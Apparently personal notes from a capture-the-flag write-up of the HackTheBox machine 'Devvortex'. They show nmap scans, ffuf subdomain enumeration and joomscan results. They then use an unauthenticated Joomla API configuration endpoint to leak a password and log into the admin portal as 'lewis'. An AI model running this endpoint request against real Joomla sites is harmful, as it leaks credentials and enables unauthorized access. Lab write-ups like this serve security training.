##### nmap

All port scan
```bash
sudo nmap -sV -p- -v  -oA nmap2
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Service scan
```bash
sudo nmap -sC -sV 10.10.11.242 -p 22,80 -v -oA nmap
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Performed subdomain enumeration
```bash
ffuf -u http://10.10.11.242 -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18 -mc all -fs 154
```
![[Pasted image 20240905184955.png]]
##### manual
- added devvortex.htb to `/etc/hosts`
- added dev.devvortex.htb to `/etc/hosts`
- ![[Pasted image 20240905185557.png]]
- we are dealing with Joomla CMS
- ![[Pasted image 20240905190520.png]]
- Found this and we do have an /api endpoint in our Joomla installation.
- Ran `joomscan`
```bash
joomscan -u http://dev.devvortex.htb
```
![[Pasted image 20240905190635.png]]
- ![[Pasted image 20240905190739.png]]
- ![[Pasted image 20240905190747.png]]
- Found 2 users - lewis and logan. lewis is part of super users
- /api/index.php/v1/config/application?public=true
![[Pasted image 20240905192453.png]]
Found a password `P4ntherg0t1n5r3c0n##`
- Successfully logged into the Joomla Admin portal using `lewis:P4ntherg0t1n5r3c0n##`

